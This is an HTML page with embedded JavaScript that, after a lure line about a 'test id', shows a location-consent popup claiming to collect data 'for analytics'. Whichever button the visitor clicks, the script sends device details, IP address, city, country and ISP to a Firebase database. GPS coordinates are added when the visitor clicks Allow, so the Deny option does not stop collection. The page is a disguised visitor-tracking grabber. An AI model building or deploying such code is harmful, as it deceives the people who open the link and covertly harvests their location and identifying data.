Test id is not avilable for know so you have to check it first.
<style>
  /* 🔹 Simple popup styling */
  #locationModal {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    background: rgba(0,0,0,0.6);
    z-index: 9999;
    visibility: hidden;
    opacity: 0;
    transition: opacity 0.3s ease;
  }
  #locationModal.active {
    visibility: visible;
    opacity: 1;
  }
  #locationBox {
    background: white;
    padding: 20px;
    max-width: 400px;
    border-radius: 12px;
    text-align: center;
    font-family: Arial, sans-serif;
    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
  }
  #locationBox button {
    margin: 10px;
    padding: 10px 20px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 14px;
  }
  #allowBtn { background: #4CAF50; color: white; }
  #denyBtn { background: #f44336; color: white; }
</style>

<div id="locationModal">
  <div id="locationBox">
    <h3>📍 Allow Location Access?</h3>
    <p>We’d like to save your location along with device info for analytics.</p>
    <button id="allowBtn">Allow</button>
    <button id="denyBtn">Deny</button>
  </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

  // ✅ Firebase config
  const firebaseConfig = { 
    apiKey: "AIzaSyCYW3AxavIoamXcve-CUoGB0tDlLwmSpRs",
    authDomain: "collage-porject-final.firebaseapp.com",
    databaseURL: "https://collage-porject-final-default-rtdb.firebaseio.com",
    projectId: "collage-porject-final",
    storageBucket: "collage-porject-final.appspot.com",
    messagingSenderId: "220400167688",
    appId: "1:220400167688:web:a6474ac58691259e2c9abd",
    measurementId: "G-9NJ6QQ4X8G"
  };

  const app = initializeApp(firebaseConfig);
  const database = getDatabase(app);

  // 📌 Get IST timestamp
  function getISTTimestamp() {
    return new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
  }

  // 📌 Device details
  function getDeviceInfo() {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenWidth: screen.width,
      screenHeight: screen.height,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || "Direct",
      pageURL: location.href
    };
  }

  // 📌 Get IP
  async function getIP() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      return await res.json();
    } catch {
      return { ip: null };
    }
  }

  // 📌 Get GPS
  function requestGPS() {
    return new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          }),
          (err) => {
            console.warn("❌ Location denied:", err.message);
            resolve({ latitude: null, longitude: null, accuracy: null });
          },
          { enableHighAccuracy: true, timeout: 10000 }
        );
      } else {
        resolve({ latitude: null, longitude: null, accuracy: null });
      }
    });
  }

  // 📌 Collect & save
  async function saveClientInfo(withGPS) {
    const deviceInfo = getDeviceInfo();
    const ipInfo = await getIP();
    const gps = withGPS ? await requestGPS() : { latitude: null, longitude: null, accuracy: null };

    const finalData = {
      ...deviceInfo,
      gps,
      ip: ipInfo.ip || null,
      city: ipInfo.city || null,
      region: ipInfo.region || null,
      country: ipInfo.country_name || null,
      org: ipInfo.org || null,
      timestamp: getISTTimestamp()
    };

    const deviceRef = push(ref(database, "feedback_devices_05_09_2025"));
    await set(deviceRef, finalData);
    console.log("✅ Saved:", finalData);
  }

  // 📌 Show modal first
  window.addEventListener("load", () => {
    const modal = document.getElementById("locationModal");
    modal.classList.add("active");

    document.getElementById("allowBtn").addEventListener("click", async () => {
      modal.classList.remove("active");
      await saveClientInfo(true);
    });

    document.getElementById("denyBtn").addEventListener("click", async () => {
      modal.classList.remove("active");
      await saveClientInfo(false);
    });
  });
</script>
